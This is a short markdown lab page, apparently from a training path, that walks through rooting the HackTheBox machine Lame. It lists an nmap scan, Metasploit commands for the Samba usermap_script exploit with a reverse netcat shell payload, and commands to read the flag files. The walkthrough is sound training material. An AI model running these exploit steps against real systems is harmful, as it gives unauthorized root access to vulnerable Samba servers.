# Lab 07: HackTheBox - Lame

[⬅️ Previous](Lab-06-Advanced-Track-Windows-Privesc.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-08-Advanced-Track-HTB-Legacy.md)

---

## 🎯 Lab Objective
Exploit Samba vulnerability to get root on HTB Lame.

## 🌐 Direct Lab Access
- HTB Machine: https://app.hackthebox.com/machines/Lame

---

## 📝 Walkthrough

### 1. Nmap Scan
```bash
nmap -p- -sV -sC -O 10.10.10.3 -oN lame_nmap.txt
```

### 2. Samba Exploit
```bash
msfconsole -q
search samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/reverse_netcat
set LHOST tun0
exploit
```

### 3. Get Flags
```bash
cat /root/root.txt
cat /home/makis/user.txt
```

---

## 🔗 Additional Resources
- HTB Lame Writeups: https://www.hackthebox.com/machines/lame

---

[⬅️ Previous](Lab-06-Advanced-Track-Windows-Privesc.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-08-Advanced-Track-HTB-Legacy.md)
